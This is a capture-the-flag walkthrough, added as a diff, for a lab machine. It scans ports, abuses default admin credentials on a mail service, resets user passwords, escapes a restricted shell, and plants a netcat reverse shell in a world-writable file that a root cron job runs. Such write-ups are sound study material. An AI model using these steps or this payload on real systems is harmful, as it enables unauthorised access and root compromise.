@@ -1,0 +1,51 @@
+1. Nmap all ports and place them in a list to run thorough nmap scan.
+	cat full-results.nmap | grep -oP '\d{1,5}/tcp' | sed 's/\/tcp/,/' | tr -d '\n' | sed 's/,$//' > ports.txt
+	nmap -p 22,25,80,110,119,4555 -sV -sC -oA final-scan --script vuln 10.10.10.51
+
+2. We explore port 4555 with nc, we are then prompted to enter a username and password, all of which are 
+   "root:root" to create a brute forces check for other videos of him using pwn tools and bufferoverflows.
+   Or use python and expect to create a brute forcer.
+   
+3. Next step looking at the HELP menu we find a way to list users, we edit the mailadmin password to 
+   password, and next use thunderbird to use the account and setting the right smtp ports.
+
+	listusers
+	Existing accounts 5
+	user: james
+	user: thomas
+	user: john
+	user: mindy
+	user: mailadmin
+
+   We try to setup the mailadmin user but we do not see any messages for which we now focus on the mindy
+   user and change her password to password. 
+
+   Note: the user is set to mindy and email mindy@10.10.10.51 with password "password", we then get two 
+   messages
+   
+   One containing a password for ssh access
+
+	username: mindy
+	pass: P@55W0rd1!2@
+
+4. Upon logging in we are presented with a restricted bash shell, to bypass this measure you can use the 
+   following command while sshing:
+	ssh mindy@10.10.10.51 -t "bash --noprofile"
+
+5. After escaping the shell, we run our enumeration scripts. We use LinEnum.sh with the "-t" option set
+   After performing the enumeration we find a file owned by root that is world writeable "/opt/tmp.py"
+
+6. Next step is to get a reverse shell by leveraging the file. There is apparently a cron job running 
+   every three minutes by root that executes that "tmp.py" file. To leverage it, the following to the files
+   contents to get a reverse shell.
+
+	#!/usr/bin/env python
+	import os
+	import sys
+	try:
+		os.system('nc 10.10.14.36 1234 -e /bin/bash ')
+	except:
+		sys.exit()
+
+7. We setup and just wait for the shell.
+
